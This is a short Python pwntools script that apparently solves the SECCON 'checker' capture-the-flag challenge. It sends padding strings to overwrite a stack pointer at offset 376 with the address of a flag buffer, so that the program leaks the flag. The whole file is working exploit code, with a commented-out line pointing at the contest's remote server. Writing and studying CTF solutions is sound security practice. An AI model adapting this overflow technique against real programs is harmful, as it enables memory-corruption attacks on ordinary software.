from pwn import *


#context.log_level = 'debug'

#p = remote('checker.pwn.seccon.jp',14726)
p = process('checker')

flag_addr = 0x00000000006010C0
index = 376

def crack(p,payload):
	p.recvuntil('NAME : ')
	p.sendline('muhe')
	for i in range(8):
		p.recvuntil('>>')
		p.sendline("A"*(index+8-i))
	#p.recvuntil('>>')
	p.sendline('yes')
	#p.recvuntil('FLAG : ')
	p.sendline(payload)


payload = cyclic(index,n=8) + p64(flag_addr)
crack(p,payload)
p.interactive()